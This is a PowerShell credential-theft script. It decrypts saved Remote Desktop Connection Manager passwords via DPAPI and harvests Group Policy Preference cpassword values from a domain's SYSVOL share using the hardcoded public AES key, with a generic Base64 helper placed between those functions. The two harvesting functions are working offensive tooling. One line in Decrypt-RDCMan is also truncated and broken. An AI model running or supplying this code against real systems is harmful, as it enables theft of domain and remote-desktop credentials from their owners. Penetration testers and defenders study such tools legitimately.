﻿function Decrypt-RDCMan ($FilePath) {

    if (!$FilePath) {
        [xml]$config = Get-Content "$env:LOCALAPPDATA\microsoft\remote desktop connection manager\rdcman.settings"
        $Xml = Select-Xml -Xml $config -XPath "//FilesToOpen/*"
        $Xml | select-object -ExpandProperty "Node"| % {Write-Output "Decrypting file: " $_.InnerText; Decrypt-RDCMan $_.InnerText}
    } else {
    [xml]$Types = Get-Content $FilePath

    $Xml = Select-Xml -Xml $Types -XPath "//logonCredentials"


    $Xml | select-object -ExpandProperty "Node" | % { $pass = Decrypt-DPAPI $_.Password; $_.Domain + "\" + $_.Username + " - " + $Pass + " - " + "Hash:" + $_.Password + "`n" } 


    $Xml | select-object -ExpandProperty "Node" | % { $pass = Decrypt-DPAPI $_.Password."
    }
}

function Decrypt-DPAPI ($EncryptedString) {

    Add-Type -assembly System.Security
    $encoding= [System.Text.Encoding]::ASCII
    $uencoding = [System.Text.Encoding]::UNICODE


    try {
    	$encryptedBytes = [System.Convert]::FromBase64String($encryptedstring)
        $bytes1 = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
        [System.Text.Encoding]::Convert([System.Text.Encoding]::UNICODE, $encoding, $bytes1) | % { $myStr1 += [char]$_}
        echo $myStr1
    } 
    catch {

        try {
            $encryptedBytes = [System.Convert]::FromBase64String($encryptedstring)
            $bytes1 = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedBytes, $null, [System.Security.Cryptography.DataProtectionScope]::LocalMachine)
            [System.Text.Encoding]::Convert([System.Text.Encoding]::UNICODE, $encoding, $bytes1) | % { $myStr1 += [char]$_}
            echo $myStr1
        }
	    catch {
            echo "Could not decrypt password"
        }
    }
}

Function Convert-Base64 {
<#
.SYNOPSIS
This cmdlet is used to Encode or Decode Base64 strings.


.DESCRIPTION
Convert a string of text to or from Base64 format. Pipeline input is accepted in string format. Use the switch parameters Encode or Decode to define which action you wish to perform on your string


.PARAMETER Value
Defines the string to be encoded or decoded with base64.

.PARAMETER Encode
This switch parameter is used to tell the cmdlet to encode the base64 string

.PARAMETER Decode
This switch parameter is used to tell the cmdlet to decode the base64 string

.PARAMETER TextEncoding
This parameter is used to define the type of Unicode Character encoding to convert with Base64. This value you can be ASCII, BigEndianUnicode, Default, Unicode, UTF32, UTF7, or UTF8. The default value is UTF8


.EXAMPLE
Convert-Base64 -Value 'Hello World!'' -Encode
# This example encodes "Hello World into Base64 format.

.EXAMPLE
Convert-Base64 -Value 'SGVsbG8gV29ybGQh' -Decode -TextEncoding ASCII
# This example decodes Base64 to a string in ASCII format


.NOTES
Author: Robert H. Osborne
Alias: tobor
Contact: rosborne@osbornepro.com


.LINK
https://powershell.org/2020/11/writing-your-own-powershell-functions-cmdlets/
https://osbornepro.com
https://writeups.osbornepro.com
https://btpssecpack.osbornepro.com
https://github.com/tobor88
https://gitlab.com/tobor88
https://www.powershellgallery.com/profiles/tobor
https://www.linkedin.com/in/roberthosborne/
https://www.credly.com/users/roberthosborne/badges
https://www.hackthebox.eu/profile/52286


.INPUTS
System.String, -Value accepts strings from pipeline.


.OUTPUTS
System.String

#>
    [CmdletBinding(DefaultParameterSetName='Encode')]
        param(
            [Parameter(
                Mandatory=$True,
                Position=0,
                ValueFromPipeline=$True,
                HelpMessage="Enter a string you wish to encode or decode using Base64. Example: Hello World!")] # End Parameter
            [String]$Value,

            [Parameter(
                ParameterSetName='Encode',
                Mandatory=$True)]
            [Switch][Bool]$Encode,

            [Parameter(
                ParameterSetName='Decode',
                Mandatory=$True)]
            [Switch][Bool]$Decode,

            [Parameter(
                Mandatory=$False,
                ValueFromPipeline=$False)]  # End Parameter
            [ValidateSet('ASCII', 'BigEndianUnicode', 'Default', 'Unicode', 'UTF32', 'UTF7', 'UTF8')]
            [String]$TextEncoding = 'UTF8'
        ) # End param

PROCESS {

    Switch ($PSCmdlet.ParameterSetName) {

        'Encode' {

            Switch ($TextEncoding) {

                'ASCII' {$StringValue  = [System.Text.Encoding]::ASCII.GetBytes("$Value")}

                'BigEndianUnicode' {$StringValue  = [System.Text.Encoding]::BigEndianUnicode.GetBytes("$Value")}

                'Default' {$StringValue  = [System.Text.Encoding]::Default.GetBytes("$Value")}

                'Unicode' {$StringValue  = [System.Text.Encoding]::Unicode.GetBytes("$Value")}

                'UTF32'  {$StringValue  = [System.Text.Encoding]::UTF32.GetBytes("$Value")}

                'UTF7' {$StringValue  = [System.Text.Encoding]::UTF7.GetBytes("$Value")}

                'UTF8' {$StringValue  = [System.Text.Encoding]::UTF8.GetBytes("$Value")}

            }  # End Switch

            Try {

                [System.Convert]::ToBase64String($StringValue)

            } Catch {

                Throw "String could not be converted to Base64. The value entered is below. `n$Value"
                $Error[0]

            } # End Catch

        }  # End Switch Encode

        'Decode' {

            $EncodedValue = [System.Convert]::FromBase64String("$Value")

            Switch ($TextEncoding) {

                'ASCII' {

                    Try {

                        [System.Text.Encoding]::ASCII.GetString($EncodedValue)

                    } Catch {

                        Throw "[x] Base64 entered was not in a correct format. The value received is below. `n$Value"

                    }  # End Try Catch

                }  # End Switch ASCII

                'BigEndianUnicode' {

                    Try {

                        [System.Text.Encoding]::BigEndianUnicode.GetString($EncodedValue)

                    } Catch {

                        Throw "[x] Base64 entered was not in a correct format. The value received is below. `n$Value"

                    } # End Try Catch

                }  # End Switch BigEndianUnicode

                'Default' {

                    Try {

                        [System.Text.Encoding]::Default.GetString($EncodedValue)

                    } Catch {

                        Throw "[x] Base64 entered was not in a correct format. The value received is below. `n$Value"

                    } # End Try Catch

                }  # End Switch Default

                'Unicode' {

                    Try {

                        [System.Text.Encoding]::Unicode.GetString($EncodedValue)

                    } Catch {

                        Throw "[x] Base64 entered was not in a correct format. The value received is below. `n$Value"

                    } # End Try Catch

                }  # End Switch Unicode

                'UTF32'  {

                    Try {

                        [System.Text.Encoding]::UTF32.GetString($EncodedValue)

                    } Catch {

                        Throw "[x] Base64 entered was not in a correct format. The value received is below. `n$Value"

                    } # End Try Catch

                }  # End Switch UTF32

                'UTF7' {

                    Try {

                        [System.Text.Encoding]::UTF7.GetString($EncodedValue)

                    } Catch {

                        Throw "[x] Base64 entered was not in a correct format. The value received is below. `n$Value"

                    } # End Catch

                }  # End Swithc UTF7

                'UTF8' {

                    Try {

                        [System.Text.Encoding]::UTF8.GetString($EncodedValue)

                    } Catch {

                        Throw "[x] Base64 entered was not in a correct format. The value received is below. `n$Value"

                    } # End Catch

                }  # End Switch UTF8

            }  # End Switch

        }  # End Switch Decode

    }  # End Switch

}  # End PROCESS

} # End Function Convert-Base64

function Get-GPPPassword {


    [CmdletBinding()]
    Param (
            [ValidateNotNullOrEmpty()]
            [String]
            $Server = $Env:USERDNSDOMAIN
    )


    Set-StrictMode -Version 2
    [System.Reflection.Assembly]::LoadWithPartialName("System.Core") |Out-Null

    function Get-DecryptedCpassword {
        [CmdletBinding()]
        Param (
            [string] $Cpassword 
        )

        try {

            $Mod = ($Cpassword.length % 4)

            switch ($Mod) {
            '1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
            '2' {$Cpassword += ('=' * (4 - $Mod))}
            '3' {$Cpassword += ('=' * (4 - $Mod))}
            }

            $Base64Decoded = [Convert]::FromBase64String($Cpassword)


            $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
            [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                                 0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)


            $AesIV = New-Object Byte[]($AesObject.IV.Length) 
            $AesObject.IV = $AesIV
            $AesObject.Key = $AesKey
            $DecryptorObject = $AesObject.CreateDecryptor() 
            [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)

            return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
        } 

        catch {Write-Error $Error[0]}
    }  


    function Get-GPPInnerFields {
    [CmdletBinding()]
        Param (
            $File
        )

        try {

            $Filename = Split-Path $File -Leaf
            [xml] $Xml = Get-Content ($File)


            $Cpassword = @()
            $UserName = @()
            $NewName = @()
            $Changed = @()
            $Password = @()


            if ($Xml.innerxml -like "*cpassword*"){

                Write-Verbose "Potential password in $File"

                switch ($Filename) {

                    'Groups.xml' {
                        $Cpassword += , $Xml | Select-Xml "/Groups/User/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/Groups/User/Properties/@userName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $NewName += , $Xml | Select-Xml "/Groups/User/Properties/@newName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/Groups/User/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }

                    'Services.xml' {  
                        $Cpassword += , $Xml | Select-Xml "/NTServices/NTService/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/NTServices/NTService/Properties/@accountName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/NTServices/NTService/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }

                    'Scheduledtasks.xml' {
                        $Cpassword += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@runAs" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/ScheduledTasks/Task/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }

                    'DataSources.xml' { 
                        $Cpassword += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/DataSources/DataSource/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}                          
                    }

                    'Printers.xml' { 
                        $Cpassword += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/Printers/SharedPrinter/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }

                    'Drives.xml' { 
                        $Cpassword += , $Xml | Select-Xml "/Drives/Drive/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/Drives/Drive/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/Drives/Drive/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value} 
                    }
                }
           }

           foreach ($Pass in $Cpassword) {
               Write-Verbose "Decrypting $Pass"
               $DecryptedPassword = Get-DecryptedCpassword $Pass
               Write-Verbose "Decrypted a password of $DecryptedPassword"

               $Password += , $DecryptedPassword
           }


            if (!($Password)) {$Password = '[BLANK]'}
            if (!($UserName)) {$UserName = '[BLANK]'}
            if (!($Changed)) {$Changed = '[BLANK]'}
            if (!($NewName)) {$NewName = '[BLANK]'}


            $ObjectProperties = @{'Passwords' = $Password;
                                  'UserNames' = $UserName;
                                  'Changed' = $Changed;
                                  'NewName' = $NewName;
                                  'File' = $File}

            $ResultsObject = New-Object -TypeName PSObject -Property $ObjectProperties
            Write-Verbose "The password is between {} and may be more than one value."
            if ($ResultsObject) {Return $ResultsObject} 
        }

        catch {Write-Error $Error[0]}
    }

    try {

        if ( ( ((Get-WmiObject Win32_ComputerSystem).partofdomain) -eq $False ) -or ( -not $Env:USERDNSDOMAIN ) ) {
            throw 'Machine is not a domain member or User is not a member of the domain.'
        }


        Write-Verbose "Searching \\$Server\SYSVOL. This could take a while."
        $XMlFiles = Get-ChildItem -Path "\\$Server\SYSVOL" -Recurse -ErrorAction SilentlyContinue -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml'

        if ( -not $XMlFiles ) {throw 'No preference files found.'}

        Write-Verbose "Found $($XMLFiles | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords."

        foreach ($File in $XMLFiles) {
            $Result = (Get-GppInnerFields $File.Fullname)
            Write-Output $Result
        }
    }

    catch {Write-Error $Error[0]}
}

